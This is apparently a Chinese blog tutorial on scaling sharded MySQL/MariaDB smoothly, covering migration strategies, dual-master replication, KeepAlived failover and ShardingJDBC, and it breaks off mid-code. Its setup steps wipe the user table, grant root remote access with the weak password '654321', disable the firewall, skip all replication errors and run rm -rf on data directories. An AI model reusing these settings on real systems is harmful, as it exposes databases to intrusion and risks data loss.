<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>数据库扩容也可以如此丝滑，MySQL千亿级数据生产环境扩容实战 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">数据库扩容也可以如此丝滑，MySQL千亿级数据生产环境扩容实战</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-light">
                    
                        
                    
                    <h1>
<a id="_0"></a>数据库平滑扩容</h1> 
<h2>
<a id="_2"></a>目录</h2> 
<p>1：理解传统扩容实现方案</p> 
<p>2：理解平滑扩容双写方案</p> 
<p>3：掌握数据库2N扩容方案</p> 
<p>4：实现数据库双主同步</p> 
<p>5：掌握ShardingJDBC路由以及动态扩容技术</p> 
<p>6：掌握KeepAlived+MariaDB数据库高可用方案</p> 
<h2>
<a id="1__18"></a>1. 扩容方案剖析</h2> 
<h3>
<a id="11___20"></a>1.1 扩容问题</h3> 
<p>在项目初期，我们部署了三个数据库A、B、C，此时数据库的规模可以满足我们的业务需求。为了将数据做到平均分配，我们在Service服务层使用uid%3进行取模分片，从而将数据平均分配到三个数据库中。</p> 
<p>如图所示：<br> <img src="https://images2.imgbox.com/c4/02/QorUo9NY_o.png" alt="file"></p> 
<p>后期随着用户量的增加，用户产生的数据信息被源源不断的添加到数据库中，最终达到数据库的最佳存储容量。如果此时继续向数据库中新增数据，会导致数据库的CRUD等基本操作变慢，进而影响整个服务的响应速度。</p> 
<p>这时，我们需要增加新的节点，对数据库进行水平扩容，那么加入新的数据库D后，数据库的规模由原来的3个变为4个。</p> 
<p>如图所示：</p> 
<p><img src="https://images2.imgbox.com/9f/f5/UKRtamFP_o.png" alt="file"></p> 
<p>此时由于分片规则发生了变化（uid%3 变为uid%4），导致大部分的数据，无法命中原有的数据，需要重新进行分配，要做大量的数据迁移处理。</p> 
<blockquote> 
 <p>比如之前uid如果是uid=3取模3%3=0， 是分配在A库上，新加入D库后， uid=3取模3%4=3，分配在D库上；</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/31/68/SYj8bm2N_o.png" alt="file"></p> 
<p>新增一个节点， 大概会有90%的数据需要迁移， 这样会面临大量的数据压力，并且对服务造成极大的不稳定性。</p> 
<h3>
<a id="12___45"></a>1.2 停机方案</h3> 
<p><img src="https://images2.imgbox.com/33/1e/nllslQ2g_o.png" alt="file"></p> 
<ol>
<li> <p>发布公告</p> <p>为了进行数据的重新拆分，在停止服务之前，我们需要提前通知用户，比如：我们的服务会在yyyy-MM-dd进行升级，给您带来的不便敬请谅解。</p> </li>
<li> <p>停止服务</p> <p>关闭Service</p> </li>
<li> <p>离线数据迁移（拆分，重新分配数据）</p> <p>将旧库中的数据按照Service层的算法，将数据拆分，重新分配数据</p> </li>
<li> <p>数据校验</p> <p>开发定制一个程序对旧库和新库中的数据进行校验，比对</p> </li>
<li> <p>更改配置</p> <p>修改Service层的配置算法，也就是将原来的uid%3变为uid%4</p> </li>
<li> <p>恢复服务</p> <p>重启Service服务</p> </li>
<li> <p>回滚预案</p> <p>针对上述的每个步骤都要有数据回滚预案，一旦某个环节（如：数据迁移，恢复服务等）执行失败，立刻进行回滚，重新再来</p> </li>
</ol> 
<p>停止服务之后， 能够保证迁移工作的正常进行， 但是服务停止，伤害用户体验， 并造成了时间压力， 必须在指定的时间内完成迁移。</p> 
<h3>
<a id="13___81"></a>1.3 停写方案</h3> 
<p><img src="https://images2.imgbox.com/e5/98/ux3rBkuZ_o.png" alt="file"></p> 
<ol>
<li> <p>支持读写分离</p> <p>数据库支持读写分离，在扩容之前，每个数据库都提供了读写功能，数据重新分配的过程中，将每个数据库设置为只读状态，关闭写的功能</p> </li>
<li> <p>升级公告</p> <p>为了进行数据的重新拆分，在停写之前，我们需要提前通知用户，比如：我们的服务会在yyyy-MM-dd进行升级，给您带来的不便敬请谅解。</p> </li>
<li> <p>中断写操作，隔离写数据源（或拦截返回统一提示）</p> <p>在Service层对所有的写请求进行拦截，统一返回提示信息，如：服务正在升级中，只对外提供读服务</p> </li>
<li> <p>数据同步处理</p> <p>将旧库中的数据按照Service层的算法，将数据重新分配，迁移（复制数据）</p> </li>
<li> <p>数据校验</p> <p>开发定制一个程序对旧库中的数据进行备份，使用备份的数据和重新分配后的数据进行校验，比对</p> </li>
<li> <p>更改配置</p> <p>通过配置中心，修改Service层的配置算法，也就是将原来的uid%3变为uid%4，这个过程不需要重启服务</p> </li>
<li> <p>恢复写操作</p> <p>设置数据库恢复读写功能，去除Service层的拦截提示</p> </li>
<li> <p>数据清理</p> <p>使用delete语句对冗余数据进行删除</p> </li>
<li> <p>回滚预案</p> <p>针对上述的每个步骤都要有数据回滚预案，一旦某个环节（如：数据迁移等）执行失败，立刻进行回滚，重新再来</p> </li>
</ol> 
<p>缺点：在数据的复制过程需要消耗大量的时间，停写时间太长，数据需要先复制，再清理冗余数据</p> 
<h3>
<a id="14___125"></a>1.4 日志方案</h3> 
<p>核心是通过日志进行数据库的同步迁移， 主要操作步骤如下：</p> 
<ol><li>数据迁移之前， 业务应用访问旧的数据库节点。</li></ol> 
<p><img src="https://images2.imgbox.com/e5/32/PKgbN6nK_o.png" alt="file"></p> 
<ol start="2"><li> <p>日志记录</p> <p>在升级之前， 记录“对旧数据库上的数据修改”的日志（这里修改包括增、删、改），这个日志不需要记录详细的数据信息，主要记录：</p> <p>（1）修改的库；</p> <p>（2）修改的表；</p> <p>（3）修改的唯一主键；</p> <p>（4）修改操作类型。</p> </li></ol> 
<p><img src="https://images2.imgbox.com/14/7e/dP2SZP3C_o.png" alt="file"></p> 
<p>日志记录不用关注新增了哪些信息，修改的数据格式，只需要记录以上数据信息，这样日志格式是固定的， 这样能保证方案的通用性。</p> 
<p>服务升级日志记录功能风险较小：</p> 
<blockquote> 
 <p>写和修改接口是少数， 改动点少；</p> 
 <p>升级只是增加了一些日志，采用异步方式实现， 对业务功能没有太多影响。</p> 
</blockquote> 
<ol start="3">
<li> <p>数据迁移：</p> <p>研发定制数据迁移工具， 作用是把旧库中的数据迁移至新库中。</p> <p><img src="https://images2.imgbox.com/f9/df/GhXaIdMd_o.png" alt="file"></p> 
  <blockquote> 
   <p>整个过程仍然采用旧库进行对外服务。</p> 
   <p>数据同步工具实现复杂度不高。</p> 
   <p>只对旧库进行读取操作， 如果同步出现问题， 都可以对新库进行回滚操作。</p> 
   <p>可以限速或分批迁移执行， 不会有时间压力。</p> 
  </blockquote> <p>数据迁移完成之后， 并不能切换至新库提供服务。</p> <p>因为旧库依然对线上提供服务， 库中的数据随时会发生变化， 但这些变化的数据并没有同步到新库中， 旧库和新库数据不一致， 所以不能直接进行切换， 需要将数据同步完整。</p> </li>
<li> <p>日志增量迁移</p> </li>
</ol> 
<p><img src="https://images2.imgbox.com/ac/83/MaQ7CX85_o.png" alt="file"></p> 
<p>研发一个日志迁移工具，把上面迁移数据过程中的差异数据追平，处理步骤：</p> 
<blockquote> 
 <p>读取log日志，获取具体是哪个库、表和主键发生了变化修改；</p> 
 <p>把旧库中的主键记录读取出来</p> 
 <p>根据主键ID，把新库中的记录替换掉</p> 
</blockquote> 
<p>这样可以最大程度的保障数据的一致性。风险分析：</p> 
<blockquote> 
 <p>整个过程， 仍然是旧库对线上提供服务；</p> 
 <p>日志迁移工具实现的复杂度较低；</p> 
 <p>任何时间发现问题， 可以重新再来，有充分的容错空间；</p> 
 <p>可以限速重放处理日志， 处理过程不会因为对线上影响造成时间压力。</p> 
</blockquote> 
<p>但是， 日志增量同步完成之后， 还不能切换到新的数据库。</p> 
<p>因为日志增量同步过程中，旧库中可能有数据发生变化， 导致数据不一致，所以需要进一步读取日志， 追平数据记录； 日志增量同步过程随时可能会产生新的数据， 新库与旧库的数据追平也会是一个无限逼近的过程。</p> 
<ol start="5"><li> <p>数据校验</p> <p>准备好数据校验工具，将旧库和新库中的数据进行比对，直到数据完全一致。</p> </li></ol> 
<p><img src="https://images2.imgbox.com/d9/ee/aG0NgDSw_o.png" alt="file"></p> 
<ol start="6"><li> <p>切换新库</p> <p>数据比对完成之后， 将流量转移切换至新库， 至此新库提供服务， 完成迁移。</p> </li></ol> 
<p><img src="https://images2.imgbox.com/80/e8/5yH2laPA_o.png" alt="file"></p> 
<p>但是在极限情况下， 即便通过上面的数据校验处理， 也有可能出现99.99%数据一致， 不能保障完全一致，这个时候可以在旧库做一个readonly只读功能， 或者将流量屏蔽降级，等待日志增量同步工具完全追平后， 再进行新库的切换。</p> 
<p>至此，完成日志方案的迁移扩容处理， 整个过程能够持续对线上提供服务， 只会短暂的影响服务的可用性。</p> 
<p>这种方案的弊端，是操作繁琐，需要适配多个同步处理工具，成本较高， 需要制定个性化业务的同步处理， 不具备普遍性，耗费的时间周期也较长。</p> 
<h3>
<a id="15___221"></a>1.5 双写方案（中小型数据）</h3> 
<p><img src="https://images2.imgbox.com/6f/f7/MuowAXra_o.png" alt="file"></p> 
<p>双写方案可通过canal或mq做实现。</p> 
<ol>
<li> <p>增加新库，按照现有节点， 增加对应的数量。</p> </li>
<li> <p>数据迁移：避免增量影响， 先断开主从，再导入（耗时较长）， 同步完成并做校验</p> </li>
<li> <p>增量同步：开启Canal同步服务， 监听从节点数据库， 再开启主从同步，从节点收到数据后会通过Canal服务， 传递至新的DB节点。</p> </li>
<li> <p>切换新库：通过Nginx，切换访问流量至新的服务。</p> </li>
<li> <p>修复切换异常数据：在切换过程中， 如果出现，Canal未同步，但已切换至新库的请求（比如下单，修改了资金， 但还未同步 ）， 可以通过定制程序， 读取检测异常日志，做自动修复或人工处理。</p> <p>针对此种情况， 最好是在凌晨用户量小的时候， 或专门停止外网访问，进行切换，减少异常数据的产生。</p> </li>
<li> <p>数据校验：为保障数据的完全一致， 有必要对数据的数量完整性做校验。</p> </li>
</ol> 
<h3>
<a id="16__2N_244"></a>1.6 平滑2N方案（大数据量）</h3> 
<ol><li>线上数据库，为了保障其高可用，一般每台主库会配置一台从库，主库负责读写，从库负责读取。下图所示，A，B是主库，A0和B0是从库。</li></ol> 
<p><img src="https://images2.imgbox.com/bf/f9/XrJGovzz_o.png" alt="file"></p> 
<ol start="2"><li> <p>当需要扩容的时候，我们把A0和B0升级为新的主库节点，如此由2个分库变为4个分库。同时在上层的分片配置，做好映射，规则如下:</p> 
  <blockquote> 
   <p>把uid%4=0和uid%4=2的数据分别分配到A和A0主库中</p> 
   <p>把uid%4=1和uid%4=3的数据分配到B和B0主库中</p> 
  </blockquote> </li></ol> 
<p><img src="https://images2.imgbox.com/ab/cf/wcFh62ew_o.png" alt="file"></p> 
<ol start="3"><li>因为A和A0库的数据相同，B和B0数据相同，此时无需做数据迁移。只需调整变更一下分片配置即可，通过配置中心更新，不需要重启。</li></ol> 
<p><img src="https://images2.imgbox.com/67/95/Woykj25Z_o.png" alt="file"></p> 
<p>由于之前uid%2的数据是分配在2个库里面，扩容之后需要分布到4个库中，但由于旧数据仍存在（uid%4=0的节点,还有一半uid%4=2的数据），所以需要对冗余数据做一次清理。</p> 
<p>这个清理，并不会影响线上数据的一致性，可以随时随地进行。</p> 
<ol start="4"><li> <p>处理完成之后，为保证数据的高可用，以及将来下一步的扩容需求。</p> <p>可以为现有的主库再次分配一个从库。</p> </li></ol> 
<p><img src="https://images2.imgbox.com/6c/89/nkLxdZ8Y_o.png" alt="file"></p> 
<h2>
<a id="2__2N_276"></a>2. 平滑2N扩容方案实践</h2> 
<h3>
<a id="21___278"></a>2.1 实现应用服务级别的动态扩容</h3> 
<p>扩容前部署架构：</p> 
<p><img src="https://images2.imgbox.com/d8/5f/Enyop9si_o.png" alt="file"></p> 
<h4>
<a id="211_MariaDB_284"></a>2.1.1 MariaDB服务安装</h4> 
<ol>
<li> <p>切换阿里云镜像服务（YUM安装过慢可以切换）</p> <pre><code class="prism language-sh">yum -y install wget
## 备份CentOS-Base.repo
mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak

wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo

wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/epel-7.repo

yum clean all

yum makecache
</code></pre> </li>
<li> <p>配置YUM源</p> <pre><code class="prism language-sh">vi /etc/yum.repos.d/mariadb-10.2.repo 
</code></pre> <p>增加以下内容：</p> <pre><code class="prism language-sh">[mariadb]
name = MariaDB
baseurl = https://mirrors.ustc.edu.cn/mariadb/yum/10.2/centos7-amd64
gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB
gpgcheck=1
</code></pre> </li>
<li> <p>执行安装</p> <pre><code class="prism language-sh">yum -y install mariadb mariadb-server MariaDB-client  MariaDB-common
</code></pre> </li>
<li> <p>如果之前已经安装， 需要先删除（如果之前没有安装， 可以忽略此步骤）</p> 
  <ul>
<li> <p>停止Mariadb服务</p> <pre><code class="prism language-sh">[root@localhost yum.repos.d]# ps -ef | grep mysql
root       1954      1  0 Oct04 ?        00:05:43 /usr/sbin/mysqld --wsrep-new-cluster --user=root
root      89521  81403  0 07:40 pts/0    00:00:00 grep --color=auto mysql
[root@localhost yum.repos.d]# kill 1954
</code></pre> </li>
<li> <p>卸载Mariadb服务</p> <pre><code class="prism language-sh">yum -y remove Maria*
</code></pre> </li>
<li> <p>删除数据与配置：</p> <pre><code class="prism language-sh">rm -rf /var/lib/mysql/*
rm -rf /etc/my.cnf.d/
rm -rf /etc/my.cnf
</code></pre> </li>
</ul> </li>
<li> <p>启动MariaDB后，执行安全配置向导命令，可根据安全配置向导提高数据库的安全性</p> <pre><code class="prism language-sh">systemctl start mariadb

mysql_secure_installation
</code></pre> </li>
<li> <p>开启用户远程连接权限</p> <p>将连接用户root开启远程连接权限；</p> <pre><code class="prism language-sh">mysql -uroot -p654321
</code></pre> <p>进入MySQL服务， 执行以下操作：</p> <pre><code class="prism language-sh">use mysql;

delete from user;
## 配置root用户使用密码654321从任何主机都可以连接到mysql服务器
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '654321' WITH GRANT OPTION;

FLUSH PRIVILEGES;
</code></pre> </li>
</ol> 
<h4>
<a id="212_MariaDB_379"></a>2.1.2 MariaDB双主同步</h4> 
<ol>
<li> <p>在Server1增加配置：</p> <p>在/etc/my.cnf中添加以下配置：</p> <pre><code class="prism language-sh">[mysqld]
server-id  = 1
log-bin=mysql-bin
relay-log = mysql-relay-bin
## 忽略mysql、information_schema库下对表的操作
replicate-wild-ignore-table=mysql.%
replicate-wild-ignore-table=information_schema.%
## 默认的情况下mysql是关闭的;
log-slave-updates=on
## 复制过程中，有任何错误，直接跳过
slave-skip-errors=all
auto-increment-offset=1
auto-increment-increment=2
## binlog的格式：STATEMENT，ROW，MIXED
binlog_format=mixed
## 自动过期清理binlog，默认0天，即不自动清理
expire_logs_days=10
</code></pre> <p>注意， Server1自增为奇数位：</p> 
  <blockquote> 
   <p>auto-increment-offset=1 主键自增基数, 从1开始。</p> 
   <p>auto-increment-increment=2 主键自增偏移量，每次为2。</p> 
  </blockquote> </li>
<li> <p>在Server2增加配置：</p> <p>修改/etc/my.cnf:</p> <pre><code class="prism language-sh">[mysqld]
server-id = 2
log-bin=mysql-bin
relay-log = mysql-relay-bin
replicate-wild-ignore-table=mysql.%
replicate-wild-ignore-table=information_schema.%
log-slave-updates=on
slave-skip-errors=all
auto-increment-offset=2
auto-increment-increment=2
binlog_format=mixed
expire_logs_days=10

</code></pre> <p>Server2自增为偶数位：</p> 
  <blockquote> 
   <p>auto-increment-offset=2 主键自增基数, 从2开始。</p> 
   <p>auto-increment-increment=2 主键自增偏移量，每次为2。</p> 
  </blockquote> <p>配置修改完成后， 重启数据库。</p> </li>
<li> <p>同步授权配置</p> <p>在Server1创建replica用于主从同步的用户：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; grant replication slave, replication client on *.* to 'replica'@'%' identified by 'replica';
mysql&gt; flush privileges;
</code></pre> <p>查询日志文件与偏移量，开启同步时需使用：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; show master status;
+------------------+----------+--------------+------------------+
| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |
+------------------+----------+--------------+------------------+
| mysql-bin.000001 |      663 |              |                  |
+------------------+----------+--------------+------------------+

</code></pre> <p>同样， 在Server2创建replica用于主从同步的用户：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; grant replication slave, replication client on *.* to 'replica'@'%' identified by 'replica';
mysql&gt; flush privileges;
</code></pre> <p>查询日志文件与偏移量：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; show master status;
+------------------+----------+--------------+------------------+
| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |
+------------------+----------+--------------+------------------+
| mysql-bin.000001 |      663 |              |                  |
+------------------+----------+--------------+------------------+
</code></pre> </li>
<li> <p>配置主从同步信息</p> <p>在Server1中执行：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; change master to master_host='192.168.116.141',master_user='replica', master_password='replica', master_port=3306, master_log_file='mysql-bin.000007', master_log_pos=374, master_connect_retry=30;

</code></pre> <p>在Server2中执行：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; change master to master_host='192.168.116.140',master_user='replica', master_password='replica', master_port=3306, master_log_file='mysql-bin.000015', master_log_pos=374, master_connect_retry=30;

</code></pre> </li>
<li> <p>开启双主同步</p> <p>在Server1和Server2中分别执行：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt; start slave;
Query OK, 0 rows affected (0.00 sec)
</code></pre> <p>在Server1查询同步信息：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt;  show slave statusG;
*************************** 1. row ***************************
               Slave_IO_State: Waiting for master to send event
                  Master_Host: 10.10.20.126
                  Master_User: replica
                  Master_Port: 3306
                Connect_Retry: 30
              Master_Log_File: mysql-bin.000001
          Read_Master_Log_Pos: 663
               Relay_Log_File: mysql-relay-bin.000002
                Relay_Log_Pos: 555
        Relay_Master_Log_File: mysql-bin.000001
             Slave_IO_Running: Yes
            Slave_SQL_Running: Yes
...
</code></pre> <p>在Server2查询同步信息：</p> <pre><code class="prism language-sh">MariaDB [(none)]&gt;  show slave statusG;
*************************** 1. row ***************************
               Slave_IO_State: Waiting for master to send event
                  Master_Host: 10.10.20.125
                  Master_User: replica
                  Master_Port: 3306
                Connect_Retry: 30
              Master_Log_File: mysql-bin.000001
          Read_Master_Log_Pos: 663
               Relay_Log_File: mysql-relay-bin.000002
                Relay_Log_Pos: 555
        Relay_Master_Log_File: mysql-bin.000001
             Slave_IO_Running: Yes
            Slave_SQL_Running: Yes
...
</code></pre> <p>Slave_IO_Running和Slave_SQL_Running 都是Yes，说明双主同步配置成功。</p> </li>
</ol> 
<h4>
<a id="213_KeepAlived_549"></a>2.1.3 KeepAlived安装与高可用配置</h4> 
<ol>
<li> <p>在Server1与Server2两台节点安装keepalived：</p> <pre><code class="prism language-sh">yum -y install keepalived
</code></pre> </li>
<li> <p>关闭防火墙</p> <pre><code class="prism language-sh">systemctl stop firewalld
systemctl disable firewalld
</code></pre> </li>
<li> <p>设置主机名称：</p> <p>Server1节点：</p> <pre><code class="prism language-sh">hostnamectl set-hostname vip1
</code></pre> <p>Server2节点：</p> <pre><code class="prism language-sh">hostnamectl set-hostname vip2
</code></pre> </li>
<li> <p>Server1节点配置</p> <p>/etc/keepalived/keepalived.conf：</p> <pre><code class="prism language-sh">global_defs {
   router_id vip1           # 机器标识，和主机名保持一致，运行keepalived服务器的一个标识
}
vrrp_instance VI_1 {            #vrrp实例定义
    state BACKUP               #lvs的状态模式，MASTER代表主， BACKUP代表备份节点
    interface ens33               #绑定对外访问的网卡，vrrp实例绑定的网卡
    virtual_router_id 111        #虚拟路由标示，同一个vrrp实例采用唯一标示
    priority 100               #优先级，100代表最大优先级， 数字越大优先级越高
    advert_int 1              #master与backup节点同步检查的时间间隔，单位是秒
    authentication {           #设置验证信息
        auth_type PASS         #有PASS和AH两种
        auth_pass 6666         #验证密码，BACKUP密码须相同
    }
    virtual_ipaddress {         #KeepAlived虚拟的IP地址
        192.168.116.150
    }
}
virtual_server 192.168.116.150 3306 {       #配置虚拟服务器IP与访问端口
    delay_loop 6                 #健康检查时间
    lb_algo rr                  #负载均衡调度算法， rr代表轮询
    lb_kind DR                   #负载均衡转发规则 DR/NAT/
    persistence_timeout 0        #会话保持时间，这里要做测试， 所以设为0， 实际可根据session有效时间配置
    protocol TCP               #转发协议类型，支持TCP和UDP
    real_server 192.168.116.140 3306 {    #配置服务器节点VIP1    
    notify_down /usr/local/shell/mariadb.sh #当服务挂掉时， 会执行此脚本，结束keepalived进程
    weight 1               #设置权重，越大权重越高
    TCP_CHECK {              #状态监测设置
       connect_timeout 10       #超时配置， 单位秒
       retry 3             #重试次数
       delay_before_retry 3        #重试间隔
       connect_port 3306         #连接端口， 和上面保持一致
       }
    }

}

</code></pre> <p>创建关闭脚本mariadb.sh</p> <p>/usr/local/shell/mariadb.sh：</p> <pre><code class="prism language-sh">pkill keepalived
</code></pre> <p>加入执行权限：</p> <pre><code class="prism language-sh">chmod a+x mariadb.sh
</code></pre> </li>
<li> <p>Server2节点配置：</p> <pre><code class="prism language-sh">global_defs {
   router_id vip2           # 机器标识，和主机名保持一致，运行keepalived服务器的一个标识
}
vrrp_instance VI_1 {            #vrrp实例定义
    state BACKUP               #lvs的状态模式，MASTER代表主， BACKUP代表备份节点
    interface ens33               #绑定对外访问的网卡
    virtual_router_id 111        #虚拟路由标示，同一个vrrp实例采用唯一标示
    priority 98               #优先级，100代表最大优先级， 数字越大优先级越高
    advert_int 1              #master与backup节点同步检查的时间间隔，单位是秒
    authentication {           #设置验证信息
        auth_type PASS         #有PASS和AH两种
        auth_pass 6666         #验证密码，BACKUP密码须相同
    }
    virtual_ipaddress {         #KeepAlived虚拟的IP地址
        192.168.116.150
    }
}
virtual_server 192.168.116.150 3306 {       #配置虚拟服务器IP与访问端口
    delay_loop 6                 #健康检查时间
    lb_algo rr                  #负载均衡调度算法， rr代表轮询, 可以关闭
    lb_kind DR                   #负载均衡转发规则, 可以关闭
    persistence_timeout 0        #会话保持时间，这里要做测试， 所以设为0， 实际可根据session有效时间配置
    protocol TCP               #转发协议类型，支持TCP和UDP
    real_server 192.168.116.141 3306{    #配置服务器节点VIP2
    notify_down /usr/local/shell/mariadb.sh #当服务挂掉时， 会执行此脚本，结束keepalived进程
    weight 1               #设置权重，越大权重越高
    TCP_CHECK {              #r状态监测设置
       connect_timeout 10       #超时配置， 单位秒
       retry 3             #重试次数
       delay_before_retry 3        #重试间隔
       connect_port 3306         #连接端口， 和上面保持一致
       }
    }

}

</code></pre> <p>和Server1的差异项：</p> <pre><code class="prism language-sh">router_id vip2   # 机器标识，和主机名保持一致
priority 98               #优先级，100代表最大优先级， 数字越大优先级越高
real_server 10.10.20.126 3306  #配置服务器节点VIP2
</code></pre> <p>注意， 两台节点都设为BACKUP</p> <pre><code class="prism language-sh">virtual_router_id 111        #同一个vrrp实例采用唯一标示
state BACKUP
</code></pre> <p>如果不想重启后， 争夺备用节点的VIP， 可以设置此项</p> <pre><code class="prism language-sh">nopreempt #不主动抢占资源
</code></pre> <p>注意：这个配置只能设置在backup主机上，而且这个主机优先级要比另外一台高</p> </li>
<li> <p>验证高可用</p> <p>停止主节点MariaDB服务， 验证是否自动切换。</p> </li>
</ol> 
<h4>
<a id="214__711"></a>2.1.4 搭建应用服务工程</h4> 
<ol>
<li> <p>ShardingJDBC的介绍</p> <p>是ShardingSphere 下的一个产品</p> <p>定位为轻量级 Java 框架，在 Java 的 JDBC 层提供的额外服务。 它使用客户端直连数据库，以 jar 包形式提供服务，无需额外部署和依赖，可理解为增强版的 JDBC 驱动，完全兼容 JDBC 和各种 ORM 框架。</p> 
  <ul>
<li> <p>适用于任何基于 JDBC 的 ORM 框架，如：JPA, Hibernate, Mybatis, Spring JDBC Template 或直接使用 JDBC。</p> </li>
<li> <p>支持任何第三方的数据库连接池，如：DBCP, C3P0, BoneCP, Druid, HikariCP 等。</p> </li>
<li> <p>支持任意实现 JDBC 规范的数据库，目前支持 MySQL，Oracle，SQLServer，PostgreSQL 以及任何遵循 SQL92 标准的数据库</p> </li>
</ul> </li>
<li> <p>ShardingJDBC初始化流程</p> <p>1）配置ShardingRuleConfiguration对象</p> <p>2）配置表分片规则TableRuleConfiguration对象，设置分库、分表策略</p> <p>3）通过Factory对象将Rule对象与DataSource对象装配</p> <p>4）ShardingJDBC使用DataSource对象进行分库</p> </li>
</ol> 
<p><img src="https://images2.imgbox.com/88/f4/jzZ3YTg2_o.png" alt="file"></p> 
<ol start="3">
<li> <p>ShardingJDBC集成配置</p> <p>1）maven依赖</p> <p>2）规则配置application.yml</p> <p>3）创建DataSource</p> </li>
<li> <p>验证应用服务动态扩容</p> 
  <ol>
<li>配置两个数据源，分别指向Server1和Server2</li>
<li>分片只配置一个数据源</li>
<li>动态增加另一个数据源</li>
</ol> <pre><code class="prism language-java"><span class="token comment">// 动态数据源配置实现扩容</span>
<span class="token class-name">Properties</span> properties <span class="token operator">=</span> <span class="token function">loadPropertiesFile</span><span class="token punctuation">(</span><span class="token string">"datasource1.properties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
    log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"load datasource config url: "</span> <span class="token operator">+</span> properties<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">DruidDataSource</span> druidDataSource <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">DruidDataSource</span><span class="token punctuation">)</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>properties<span class="token punctuation">)</span><span class="token punctuation">;</span>
    druidDataSource<span class="token punctuation">.</span><span class="token function">setRemoveAbandoned</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    druidDataSource<span class="token punctuation">.</span><span class="token function">setRemoveAbandonedTimeout</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    druidDataSource<span class="token punctuation">.</span><span class="token function">setLogAbandoned</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置数据源错误重连时间</span>
    druidDataSource<span class="token punctuation">.</span><span class="token function">setTimeBetweenConnectErrorMillis</span><span class="token punctuation">(</span><span class="token number">60000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    druidDataSource<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">OrchestrationShardingDataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">SpringContextUtil</span><span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"tradeSystemDataSource"</span><span class="token punctuation">,</span> <span class="token class-name">OrchestrationShardingDataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">DataSource</span><span class="token punctuation">&gt;</span></span> dataSourceMap <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDataSourceMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    dataSourceMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">DatasourceEnum</span><span class="token punctuation">.</span>DATASOURCE_2<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> druidDataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">DataSourceConfiguration</span><span class="token punctuation">&gt;</span></span> dataSourceConfigMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">DataSourceConfiguration</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
